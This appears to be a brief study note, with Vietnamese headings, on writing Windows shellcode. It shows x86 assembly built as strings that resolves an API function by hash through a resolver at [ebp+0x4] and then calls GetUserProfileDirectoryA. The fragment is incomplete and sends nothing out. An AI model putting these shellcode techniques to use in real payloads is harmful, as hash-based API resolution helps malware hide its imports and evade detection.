## Assembly:
### Tìm hàm
```
code += "push 0xf2ea3914;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
code += "push 0x12345678;"
code += "mov esi, esp;"
code += "push esi;" # lpcchSize
code += "lea edi, [ebp+0x24];"
code += "push edi;" # lpProfileDir
code += "push 0xFFFFFFFC;" # htoken

code += "call [ebp + 0x10];" # call GetUserProfileDirectoryA
```
